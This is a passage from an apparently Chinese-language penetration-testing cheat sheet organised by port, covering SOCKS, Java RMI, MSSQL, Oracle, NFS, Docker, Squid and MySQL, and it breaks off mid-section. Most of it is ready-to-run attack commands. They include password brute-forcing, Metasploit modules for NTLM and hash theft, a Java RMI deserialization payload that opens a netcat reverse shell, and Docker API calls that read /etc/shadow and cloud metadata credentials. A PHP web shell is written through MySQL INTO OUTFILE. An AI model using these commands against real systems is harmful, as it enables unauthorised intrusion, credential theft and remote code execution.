<h4 id="暴力破解-6"><a href="#暴力破解-6" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script socks-brute -p 1080 &lt;ip&gt;</span><br><span class="line"></span><br><span class="line">nmap  --script socks-brute --script-args userdb=users.txt,passdb=rockyou.txt,unpwdb.timelimit=30m -p 1080 &lt;ip&gt;</span><br></pre></td></tr></table></figure>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks5 10.10.10.10 1080</span><br><span class="line"></span><br><span class="line">socks5 10.10.10.10 1080 username password  #使用认证</span><br></pre></td></tr></table></figure>
<p>refer: <a href="https://book.hacktricks.xyz/tunneling-and-port-forwarding">https://book.hacktricks.xyz/tunneling-and-port-forwarding</a></p>
<h3 id="1098-1099-Java-RMI"><a href="#1098-1099-Java-RMI" class="headerlink" title="1098-1099: Java RMI"></a>1098-1099: Java RMI</h3><h4 id="服务指纹-1"><a href="#服务指纹-1" class="headerlink" title="服务指纹"></a>服务指纹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Default port: 1090,1098,1099,1199,4443-4446,8999-9010,9999</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">1090/tcp  open  ssl/java-rmi Java RMI</span><br><span class="line">9010/tcp  open  java-rmi     Java RMI</span><br><span class="line">37471/tcp open  java-rmi     Java RMI</span><br><span class="line">40259/tcp open  ssl/java-rmi Java RMI</span><br></pre></td></tr></table></figure>
<h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）服务枚举</span><br><span class="line"></span><br><span class="line">rmg enum &#123;IP&#125; &#123;PORT&#125;</span><br><span class="line"></span><br><span class="line">2）暴力破解</span><br><span class="line"></span><br><span class="line">rmg guess &#123;IP&#125; &#123;PORT&#125;</span><br><span class="line"></span><br><span class="line">3）反序列化攻击</span><br><span class="line"></span><br><span class="line">rmg serial 172.17.0.2 9010 CommonsCollections6 &#x27;nc 172.17.0.1 4444 -e ash&#x27; --bound-name plain-server --signature &quot;String execute(String dummy)&quot;</span><br><span class="line"></span><br><span class="line">nc -vlp 4444</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://github.com/qtc-de/remote-method-guesser">https://github.com/qtc-de/remote-method-guesser</a></li>
<li><a href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a></li>
<li><a href="https://github.com/BishopFox/rmiscout">https://github.com/BishopFox/rmiscout</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/1099-pentesting-java-rmi">https://book.hacktricks.xyz/pentesting/1099-pentesting-java-rmi</a></li>
<li><a href="https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/">https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a></li>
</ul>
<h3 id="1433-MSSQL"><a href="#1433-MSSQL" class="headerlink" title="1433-MSSQL"></a>1433-MSSQL</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;</span><br><span class="line">msf&gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line"></span><br><span class="line">searchsploit &quot;microsoft sql server&quot;</span><br><span class="line">nmap --script-help &quot;*ms* and *sql*&quot;</span><br><span class="line">msf&gt; search mssql</span><br></pre></td></tr></table></figure>
<h4 id="Meatsploit"><a href="#Meatsploit" class="headerlink" title="Meatsploit"></a>Meatsploit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Set USERNAME, RHOSTS and PASSWORD</span><br><span class="line">#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used</span><br><span class="line"></span><br><span class="line">#Steal NTLM</span><br><span class="line">msf&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder</span><br><span class="line"></span><br><span class="line">#Info gathering</span><br><span class="line">msf&gt; use admin/mssql/mssql_enum #Security checks</span><br><span class="line">msf&gt; use admin/mssql/mssql_enum_domain_accounts</span><br><span class="line">msf&gt; use admin/mssql/mssql_enum_sql_logins</span><br><span class="line">msf&gt; use auxiliary/admin/mssql/mssql_findandsampledata</span><br><span class="line">msf&gt; use auxiliary/scanner/mssql/mssql_hashdump</span><br><span class="line">msf&gt; use auxiliary/scanner/mssql/mssql_schemadump</span><br><span class="line"></span><br><span class="line">#Search for insteresting data</span><br><span class="line">msf&gt; use auxiliary/admin/mssql/mssql_findandsampledata</span><br><span class="line">msf&gt; use auxiliary/admin/mssql/mssql_idf</span><br><span class="line"></span><br><span class="line">#Privesc</span><br><span class="line">msf&gt; use exploit/windows/mssql/mssql_linkcrawler</span><br><span class="line">msf&gt; use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate</span><br><span class="line">msf&gt; use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin</span><br><span class="line"></span><br><span class="line">#Code execution</span><br><span class="line">msf&gt; use admin/mssql/mssql_exec #Execute commands</span><br><span class="line">msf&gt; use exploit/windows/mssql/mssql_payload #Uploads and execute a payload</span><br><span class="line"></span><br><span class="line">#Add new admin user from meterpreter session</span><br><span class="line">msf&gt; use windows/manage/mssql_local_auth_bypass</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-7"><a href="#暴力破解-7" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Use the NetBIOS name of the machine as domain</span><br><span class="line">crackmapexec mssql &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt</span><br><span class="line">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; mssql</span><br><span class="line">medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql</span><br><span class="line">nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts &lt;host&gt; #Use domain if needed. Be carefull with the number of password in the list, this could block accounts</span><br><span class="line">msf&gt; use auxiliary/scanner/mssql/mssql_login #Be carefull, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></li>
</ul>
<h3 id="1521-1529-Oracle-TNS"><a href="#1521-1529-Oracle-TNS" class="headerlink" title="1521-1529: Oracle TNS"></a>1521-1529: Oracle TNS</h3><h4 id="服务指纹-2"><a href="#服务指纹-2" class="headerlink" title="服务指纹"></a>服务指纹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1521/tcp open  oracle-tns    Oracle TNS Listener</span><br></pre></td></tr></table></figure>
<h4 id="版本枚举"><a href="#版本枚举" class="headerlink" title="版本枚举"></a>版本枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script &quot;oracle-tns-version&quot; -p 1521 -T4 -sV &lt;IP&gt;</span><br><span class="line">msf&gt; use auxiliary/scanner/oracle/tnslsnr_version</span><br><span class="line"></span><br><span class="line">#apt install tnscmd10g</span><br><span class="line">tnscmd10g version -p 1521 -h &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener</span><br></pre></td></tr></table></figure>
<h4 id="SID枚举"><a href="#SID枚举" class="headerlink" title="SID枚举"></a>SID枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tnscmd10g status-p 1521 -h &lt;IP&gt; #The SID are inside: SERVICE=(SERVICE_NAME=&lt;SID_NAME&gt;)</span><br><span class="line"></span><br><span class="line">#msf1</span><br><span class="line">msf&gt; use auxiliary/scanner/oracle/sid_enum</span><br><span class="line">msf&gt; set rhost &lt;IP&gt;</span><br><span class="line">msf&gt; run</span><br><span class="line">#msf2</span><br><span class="line">msf&gt; use auxiliary/admin/oracle/tnscmd</span><br><span class="line">msf&gt; set CMD (CONNECT_DATA=(COMMAND=STATUS))</span><br><span class="line">msf&gt; set rhost &lt;IP&gt;</span><br><span class="line">msf&gt; run #The SID are inside: SERVICE=(SERVICE_NAME=&lt;SID_NAME&gt;)</span><br></pre></td></tr></table></figure>
<h4 id="SID爆破"><a href="#SID爆破" class="headerlink" title="SID爆破"></a>SID爆破</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 &lt;IP&gt; oracle-sid</span><br><span class="line">patator oracle_login host=&lt;IP&gt; sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505</span><br><span class="line">./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt</span><br><span class="line">msf&gt; use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt</span><br><span class="line">nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-8"><a href="#暴力破解-8" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patator oracle_login sid=&lt;SID&gt; host=&lt;IP&gt; user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017</span><br><span class="line"></span><br><span class="line">./odat.py passwordguesser -s $SERVER -d $SID</span><br><span class="line">./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt</span><br><span class="line"></span><br><span class="line">#msf1</span><br><span class="line">msf&gt; use admin/oracle/oracle_login</span><br><span class="line">msf&gt; set RHOSTS &lt;IP&gt;</span><br><span class="line">msf&gt; set RPORT 1521</span><br><span class="line">msf&gt; set SID &lt;SID&gt;</span><br><span class="line"></span><br><span class="line">#msf2, this option uses nmap and it fails sometimes for some reason</span><br><span class="line">msf&gt; use scanner/oracle/oracle_login</span><br><span class="line">msf&gt; set RHOSTS &lt;IP&gt;</span><br><span class="line">msf&gt; set RPORTS 1521</span><br><span class="line">msf&gt; set SID &lt;SID&gt;</span><br><span class="line"></span><br><span class="line">#nmap fails sometimes for some reson executing this script</span><br><span class="line">nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=&lt;SID&gt; &lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="登录连接"><a href="#登录连接" class="headerlink" title="登录连接"></a>登录连接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt;;</span><br><span class="line"></span><br><span class="line">sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;:&lt;port&gt;/&lt;SID&gt;;       #非标准端口</span><br><span class="line"></span><br><span class="line">sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt; &#x27;as sysdba&#x27;;  #高权限账户</span><br><span class="line">#Example: sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL &#x27;as sysdba&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="自动扫描"><a href="#自动扫描" class="headerlink" title="自动扫描"></a>自动扫描</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）oscanner</span><br><span class="line">#apt install oscanner</span><br><span class="line">oscanner -s &lt;IP&gt; -P &lt;PORT&gt;</span><br><span class="line"></span><br><span class="line">2）odat</span><br><span class="line">git clone https://github.com/quentinhardy/odat.git</span><br><span class="line">cd odat</span><br><span class="line">./odat.py --help</span><br><span class="line">./odat.py all -s &lt;IP&gt; -p &lt;PORT&gt;</span><br><span class="line">./odat.py all -s &lt;IP&gt; -p &lt;PORT&gt; -d &lt;SID&gt; #To bruteforce accounts for that SID</span><br></pre></td></tr></table></figure>
<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装ODAT</span><br><span class="line"></span><br><span class="line">git clone https://github.com/quentinhardy/odat.git</span><br><span class="line">cd odat</span><br><span class="line">./odat.py #It shouldn&#x27;t be problems in Kali</span><br><span class="line"></span><br><span class="line">1）通过JAVA存储过程执行代码</span><br><span class="line">./odat.py java -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --exec COMMAND</span><br><span class="line"></span><br><span class="line">2）通过定时器执行代码</span><br><span class="line">./odat.py dbmsscheduler -s &lt;IP&gt; -d &lt;SID&gt; -U &lt;username&gt; -P &lt;password&gt; --exec &quot;C:\windows\system32\cmd.exe /c echo 123&amp;gt;&amp;gt;C:\hacK&quot;</span><br><span class="line"></span><br><span class="line">3）通过外部表执行代码</span><br><span class="line">./odat.py externaltable -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --exec &quot;C:/windows/system32&quot; &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p>refer: </p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener">https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener</a></li>
</ul>
<h3 id="2049-NFS"><a href="#2049-NFS" class="headerlink" title="2049-NFS"></a>2049-NFS</h3><h4 id="指纹-x2F-配置"><a href="#指纹-x2F-配置" class="headerlink" title="指纹&#x2F;配置"></a>指纹&#x2F;配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2049/tcp open  nfs     2-3 (RPC #100003</span><br><span class="line"></span><br><span class="line">/etc/exports</span><br><span class="line">/etc/lib/nfs/etab</span><br></pre></td></tr></table></figure>
<h4 id="服务枚举-3"><a href="#服务枚举-3" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 &#123;IP&#125;</span><br><span class="line"></span><br><span class="line">MSF: scanner/nfs/nfsmount #Scan NFS mounts and list permissions</span><br></pre></td></tr></table></figure>
<h4 id="挂载利用"><a href="#挂载利用" class="headerlink" title="挂载利用"></a>挂载利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">showmount -e &lt;IP&gt;   #列举可挂载文件夹</span><br><span class="line"></span><br><span class="line">方式一：</span><br><span class="line">mount -t nfs [-o vers=2] &lt;ip&gt;:&lt;remote_folder&gt; &lt;local_folder&gt; -o nolock</span><br><span class="line"></span><br><span class="line">方式二：</span><br><span class="line">mkdir /mnt/new_back</span><br><span class="line">mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock</span><br></pre></td></tr></table></figure>
<h4 id="NFSShell"><a href="#NFSShell" class="headerlink" title="NFSShell"></a>NFSShell</h4><ul>
<li><a href="https://github.com/NetDirect/nfsshell">https://github.com/NetDirect/nfsshell</a></li>
<li><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/</a></li>
</ul>
<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><ul>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe">https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</a></li>
</ul>
<h3 id="2375-2376-Docker"><a href="#2375-2376-Docker" class="headerlink" title="2375-2376: Docker"></a>2375-2376: Docker</h3><h4 id="服务枚举-4"><a href="#服务枚举-4" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）使用curl</span><br><span class="line"></span><br><span class="line">curl -s http://open.docker.socket:2375/version | jq #Get version</span><br><span class="line"></span><br><span class="line">2) 使用docker</span><br><span class="line"></span><br><span class="line">docker -H open.docker.socket:2375 version #Get version</span><br></pre></td></tr></table></figure>
<h4 id="攻击利用-2"><a href="#攻击利用-2" class="headerlink" title="攻击利用"></a>攻击利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 快速提权</span><br><span class="line"></span><br><span class="line">docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash</span><br><span class="line"></span><br><span class="line">2) 2376-TLS连接</span><br><span class="line"></span><br><span class="line">  #List containers</span><br><span class="line">  curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq</span><br><span class="line"></span><br><span class="line">  #List processes inside a container</span><br><span class="line">  curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq</span><br><span class="line"></span><br><span class="line">  #Set up and exec job to hit the metadata URL</span><br><span class="line">  curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d &#x27;&#123; &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: true, &quot;AttachStderr&quot;: true, &quot;Cmd&quot;: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&quot;]&#125;&#x27;</span><br><span class="line"></span><br><span class="line">  #Get the output</span><br><span class="line">  curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d &#x27;&#123;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">  # list secrets (no secrets/swarm not set up)</span><br><span class="line">  curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq</span><br><span class="line"></span><br><span class="line">  #Check what is mounted</span><br><span class="line">  curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d &#x27;&#123; &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: true, &quot;AttachStderr&quot;: true, &quot;Cmd&quot;: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;mount&quot;]&#125;&#x27;</span><br><span class="line"></span><br><span class="line">  #Get the output by starting the exec</span><br><span class="line">  curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d &#x27;&#123;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">  #Cat the mounted secret</span><br><span class="line">  curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d &#x27;&#123; &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: true, &quot;AttachStderr&quot;: true, &quot;Cmd&quot;: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat /run/secrets/registry-key.key&quot;]&#125;&#x27;</span><br><span class="line"></span><br><span class="line">  #List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)</span><br><span class="line">  curl -s –insecure https://tls-opendocker.socket:2376/services | jq</span><br><span class="line"></span><br><span class="line">  #Creating a container that has mounted the host file system and read /etc/shadow</span><br><span class="line">  curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tls-opendocker.socket2376/containers/create?name=test -d &#x27;&#123;&quot;Image&quot;:&quot;alpine&quot;, &quot;Cmd&quot;:[&quot;/usr/bin/tail&quot;, &quot;-f&quot;, &quot;1234&quot;, &quot;/dev/null&quot;], &quot;Binds&quot;: [ &quot;/:/mnt&quot; ], &quot;Privileged&quot;: true&#125;&#x27;</span><br><span class="line">  curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test</span><br><span class="line">  curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d &#x27;&#123; &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: true, &quot;AttachStderr&quot;: true, &quot;Cmd&quot;: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat /mnt/etc/shadow&quot;]&#125;&#x27;</span><br><span class="line">  curl –insecure -X POST -H &quot;Content-Type: application/json&quot; https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d &#x27;&#123;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">  #Stop the container</span><br><span class="line">  curl –insecure -vv -X POST -H &quot;Content-Type: application/json&quot; https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop</span><br><span class="line"></span><br><span class="line">  #Delete stopped containers</span><br><span class="line">  curl –insecure -vv -X POST -H &quot;Content-Type: application/json&quot; https://tls-opendocker.socket:2376/containers/prune</span><br><span class="line">  </span><br><span class="line">3) 自动化</span><br><span class="line"></span><br><span class="line">msf&gt; use exploit/linux/http/docker_daemon_tcp</span><br><span class="line">nmap -sV --script &quot;docker-*&quot; -p &lt;PORT&gt; &lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker -H &lt;host&gt;:2375 run --rm -it --privileged --net=host -v /:/mnt alpine</span><br><span class="line">cat /mnt/etc/shadow</span><br></pre></td></tr></table></figure>
<p>refer: </p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/2375-pentesting-docker">https://book.hacktricks.xyz/pentesting/2375-pentesting-docker</a></li>
<li><a href="https://securityboulevard.com/2019/02/abusing-docker-api-socket/">https://securityboulevard.com/2019/02/abusing-docker-api-socket/</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/2375-pentesting-docker#basic-commands">https://book.hacktricks.xyz/pentesting/2375-pentesting-docker#basic-commands</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py</a></li>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket</a></li>
</ul>
<h3 id="3128-Squid"><a href="#3128-Squid" class="headerlink" title="3128-Squid"></a>3128-Squid</h3><h4 id="服务指纹-3"><a href="#服务指纹-3" class="headerlink" title="服务指纹"></a>服务指纹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE  SERVICE      VERSION</span><br><span class="line">3128/tcp open   http-proxy   Squid http proxy 4.11</span><br></pre></td></tr></table></figure>
<h4 id="Web代理"><a href="#Web代理" class="headerlink" title="Web代理"></a>Web代理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Try yo proxify curl</span><br><span class="line">curl --proxy http://10.10.11.131:3128 http://10.10.11.131</span><br></pre></td></tr></table></figure>
<h4 id="Nmap代理"><a href="#Nmap代理" class="headerlink" title="Nmap代理"></a>Nmap代理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxichains.conf file: http 10.10.10.10 3128</span><br><span class="line"></span><br><span class="line">proxychains nmap -sT -n -p- localhost</span><br></pre></td></tr></table></figure>
<h3 id="3306-Mysql"><a href="#3306-Mysql" class="headerlink" title="3306-Mysql"></a>3306-Mysql</h3><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）本地连接</span><br><span class="line"></span><br><span class="line">mysql -u root # Connect to root without password</span><br><span class="line">mysql -u root -p # A password will be asked (check someone)</span><br><span class="line"></span><br><span class="line">2）远程连接</span><br><span class="line"></span><br><span class="line">mysql -h &lt;Hostname&gt; -u root</span><br><span class="line">mysql -h &lt;Hostname&gt; -u root@localhost</span><br></pre></td></tr></table></figure>
<h4 id="服务枚举-5"><a href="#服务枚举-5" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;</span><br><span class="line">msf&gt; use auxiliary/scanner/mysql/mysql_version</span><br><span class="line">msf&gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">msf&gt; use auxiliary/scanner/mysql/mysql_hashdump 	#Creds</span><br><span class="line">msf&gt; use auxiliary/admin/mysql/mysql_enum 				#Creds</span><br><span class="line">msf&gt; use auxiliary/scanner/mysql/mysql_schemadump #Creds </span><br><span class="line">msf&gt; use exploit/windows/mysql/mysql_start_up 		#Execute commands Windows, Creds</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-9"><a href="#暴力破解-9" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hydra</span><br><span class="line">hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql</span><br><span class="line"></span><br><span class="line"># msfconsole</span><br><span class="line">msf&gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE false</span><br><span class="line"></span><br><span class="line"># medusa</span><br><span class="line">medusa -h &lt;IP/Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql</span><br></pre></td></tr></table></figure>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use &lt;database&gt;;</span><br><span class="line">show tables;</span><br><span class="line">describe &lt;table_name&gt;;</span><br><span class="line"></span><br><span class="line">select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges</span><br><span class="line">select user,file_priv from mysql.user where user=&#x27;root&#x27;; #File privileges</span><br><span class="line">select version(); 	#version</span><br><span class="line">select @@version(); #version</span><br><span class="line">select user(); 			#User</span><br><span class="line">select database(); 	#database name</span><br><span class="line"></span><br><span class="line">#Try to execute code</span><br><span class="line">select do_system(&#x27;id&#x27;);</span><br><span class="line">\! sh</span><br><span class="line"></span><br><span class="line">#Basic MySQLi</span><br><span class="line">Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables</span><br><span class="line">Union Select 1,2,3,4,column_name from information_schema.columns where table_name=&quot;&lt;TABLE NAME&gt;&quot;</span><br><span class="line"></span><br><span class="line">#Read &amp; Write</span><br><span class="line">select load_file(&#x27;/var/lib/mysql-files/key.txt&#x27;); #Read file</span><br><span class="line">select 1,2,&quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot;,4 into OUTFILE &#x27;C:/xampp/htdocs/back.php&#x27;</span><br><span class="line"></span><br><span class="line">#Try to change MySQL root password</span><br><span class="line">UPDATE mysql.user SET Password=PASSWORD(&#x27;MyNewPass&#x27;) WHERE User=&#x27;root&#x27;;</span><br><span class="line">UPDATE mysql.user SET authentication_string=PASSWORD(&#x27;MyNewPass&#x27;) WHERE User=&#x27;root&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line">quit;</span><br><span class="line"></span><br><span class="line">mysql -u username -p &lt; manycommands.sql   #A file with all the commands you want to execute</span><br><span class="line">mysql -u root -h 127.0.0.1 -e &#x27;show databases;&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）Current Level of access</span><br><span class="line"></span><br><span class="line">mysql&gt;select user();</span><br><span class="line">mysql&gt;select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user=&#x27;OUTPUT OF select user()&#x27;;</span><br><span class="line"></span><br><span class="line">2）Access passwords</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql</span><br><span class="line">mysql&gt; select user,password from user;</span><br><span class="line"></span><br><span class="line">3）Create a new user and grant him privileges</span><br><span class="line"></span><br><span class="line">mysql&gt;create user test identified by &#x27;test&#x27;;</span><br><span class="line">mysql&gt; grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by &#x27;mysql&#x27; WITH GRANT OPTION;</span><br><span class="line"></span><br><span class="line">4）Break into a shell</span><br><span 